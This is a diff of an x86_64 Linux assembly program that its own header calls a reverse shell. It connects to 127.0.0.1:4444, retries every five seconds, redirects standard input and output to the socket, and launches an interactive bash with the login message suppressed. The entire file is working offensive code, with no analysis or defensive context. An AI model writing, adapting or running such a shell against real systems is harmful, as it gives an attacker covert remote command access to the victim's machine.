@@ -1,78 +1,79 @@
+; reverse_shell_nopty.asm
+; NASM x86_64 Linux reverse shell WITHOUT root requirement
+; Simple dup2 socket → stdin/out/err, custom PS1 prompt, suppress MOTD
+
 section .data
-    ; Structure socket (16 octets)
-    ; 127.0.0.1:4444(little endian)
+    ; sockaddr_in struct: AF_INET, port 4444, IP 127.0.0.1
+    socket_addr:
+        dw 2                 ; AF_INET
+        dw 0x5c11            ; port 4444 (little endian)
+        dd 0x0100007f        ; IP 127.0.0.1
+        dq 0                 ; padding
 
-    socket:
-        dw 2                      
-        dw 0x5c11                 ; port
-        dd 0x0100007f             ; ip
-        dq 0                      ; sin_zero (padding inutilisé)
+    ; nanosleep timespec {5, 0}
+    ts:
+        dq 5
+        dq 0
 
-    ; Structure timespec pour nanosleep (5 secondes)
-    timespec:
-        dq 5      ; secondes
-        dq 0      ; nanosecondes
+    ; Strings for execve
+    bash_path: db "/bin/bash",0
+    arg_i:     db "-i",0
+    argv:      dq bash_path, arg_i, 0
+    ; Environment: custom PS1 and suppress message of the day
+    ps1_str:   db "PS1=\u@\h:\w$ ",0
+    hush:      db "HUSHLOGIN=TRUE",0
+    envp:      dq ps1_str, hush, 0
 
 section .text
     global _start
-
 _start:
 .connexion:
-    mov     rax, 41              ; syscall socket
-    mov     rdi, 2               ; domaine = AF_INET
-    mov     rsi, 1               ; type = SOCK_STREAM (TCP)
-    xor     rdx, rdx             ; protocole = 0
+    ; syscall socket(AF_INET, SOCK_STREAM, 0)
+    mov     rax, 41
+    mov     rdi, 2
+    mov     rsi, 1
+    xor     rdx, rdx
     syscall
-
     cmp     rax, 0
-    jl      .attente             ; si erreur, attendre et réessayer
+    jl      .attente
+    mov     r12, rax         ; sockfd
 
-    mov     rdi, rax             ; sauvegarde fd dans rdi
-    mov     r12, rax             ; conserve socket pour dup2
-
-
-    lea     rsi, [rel socket]  
-    mov     rdx, 16              
-    mov     rax, 42              ; syscall connect
+    ; syscall connect(sockfd, &socket_addr, 16)
+    mov     rdi, r12
+    lea     rsi, [rel socket_addr]
+    mov     rdx, 16
+    mov     rax, 42
     syscall
-
     cmp     rax, 0
-    jl      .attente             ; si connect échoue, attendre et retester
+    jl      .attente
 
-    ; dup2 redirige stdin, stdout, stderr vers le socket
+    ; dup2(sockfd, 0..2)
+    mov     rdi, r12
     xor     rsi, rsi
-
-.dup_loop:
-    mov     rax, 33              ; syscall dup2
-    mov     rdi, r12             ; oldfd = socket
+.dup2_loop:
+    mov     rax, 33          ; dup2
     syscall
-
     inc     rsi
     cmp     rsi, 3
-    jne     .dup_loop
+    jne     .dup2_loop
 
-    ; execve(reverse shell)
-    xor     rax, rax
-    push    rax                  ; NULL
-    mov     rbx, 0x68732f6e69622f2f ; "//bin/sh" en little endian
-    push    rbx
-    mov     rdi, rsp             ; pointeur vers "/bin/sh"
-    push    rax                  ; NULL
-    push    rdi                  ; argv[0]
-    mov     rsi, rsp             ; argv = ["/bin/sh", NULL]
-    xor     rdx, rdx             ; envp = NULL
-    mov     rax, 59              ; syscall execve
+    ; execve("/bin/bash", ["/bin/bash","-i",NULL], ["PS1=...","HUSHLOGIN=TRUE",NULL])
+    lea     rdi, [rel bash_path]
+    lea     rsi, [rel argv]
+    lea     rdx, [rel envp]
+    mov     rax, 59          ; execve
     syscall
 
 .erreur:
-    ; Sortie avec code erreur 1
+    ; exit(1)
     mov     rax, 60
     mov     rdi, 1
     syscall
 
 .attente:
-    mov     rax, 35              ; syscall nanosleep
-    lea     rdi, [rel timespec]  ; pointeur vers {5, 0}
-    xor     rsi, rsi 
+    ; nanosleep(&ts)
+    mov     rax, 35
+    lea     rdi, [rel ts]
+    xor     rsi, rsi
     syscall
-    jmp     .connexion           ; reteste
+    jmp     .connexion
